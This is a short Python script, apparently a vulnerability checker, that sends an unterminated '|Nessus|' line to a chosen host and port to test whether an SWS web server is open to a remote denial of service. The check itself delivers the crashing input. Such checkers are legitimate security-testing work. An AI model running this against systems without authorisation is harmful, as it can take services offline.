import socket
import argparse
from colorama import init, Fore

# Initialize colorama
init(autoreset=True)

def check_sws_vulnerability(host, port):
    print("Verifying Vulnerability SWS Web Server Unfinished Line Remote DoS")
    
    try:
        # Create a socket connection
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        
        # Connect to the target server
        sock.connect((host, port))
        
        # Send the malformed request
        sock.sendall(b"|Nessus|")
        
        # Try to receive a response (if any)
        try:
            response = sock.recv(1024)
            print("Server responded, it might not be vulnerable.")
        except socket.timeout:
            print(Fore.RED + "Server did not respond, it might be down or vulnerable.")
        
    except Exception as e:
        print(Fore.RED + f"Connection failed or server might be vulnerable: {e}")
    finally:
        sock.close()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Check SWS Web Server for Unfinished Line Remote DoS vulnerability")
    parser.add_argument("host", help="Target host to check")
    parser.add_argument("port", type=int, help="Target port to check", nargs='?', default=80)
    args = parser.parse_args()
    
    check_sws_vulnerability(args.host, args.port)
